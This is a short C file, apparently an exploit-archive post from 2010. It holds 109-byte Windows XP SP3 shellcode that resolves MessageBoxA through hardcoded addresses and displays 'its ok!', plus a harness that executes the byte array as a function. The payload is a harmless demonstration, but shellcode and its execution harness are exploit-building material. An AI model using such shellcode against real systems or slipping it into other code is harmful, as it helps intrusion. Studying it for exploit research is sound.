/*
# Title    : win32/xp sp3 (Tr) MessageBoxA Shellcode 109 bytes
# Proof    : http://img443.imageshack.us/img443/7900/proofaz.jpg
# Author   : ZoRLu
# mail-msn : admin@yildirimordulari.com
# Home     : z0rlu.blogspot.com
# Date     : 14/09/2010
# Tesekkur : inj3ct0r.com, r0073r, Dr.Ly0n, LifeSteaLeR, Heart_Hunter, Cyber-Zone, Stack, AlpHaNiX, ThE g0bL!N
# Temenni  : Yeni Anayasamiz Hayirli Olsun
# Lakirdi  : I dont know very well assembly. but, I know I will learn its too :P
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(){

    unsigned char shellcode[]=
    "\x31\xc0\x31\xdb\x31\xd9\x31\xd2\xeb\x35\x59\x88\x51\x0a\xbb\x7b\x1d"
    "\x80\x7c\x51\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb\x30"
    "\xae\x80\x7c\xff\xd3\xeb\x37\x59\x31\xd2\x88\x51\x07\x52\x52\x51\x52"
    "\xff\xd0\x31\xd2\x50\xb8\xfa\xca\x81\x7c\xff\xd0\xe8\xc6\xff\xff\xff"
    "\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc4\xff\xff\xff\x4d"
    "\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc4\xff\xff\xff\x69"
    "\x74\x73\x20\x6f\x6b\x21\xff";

    printf("Size = %d bytes\n", strlen(shellcode));

    ((void (*)())shellcode)();

    return 0;
}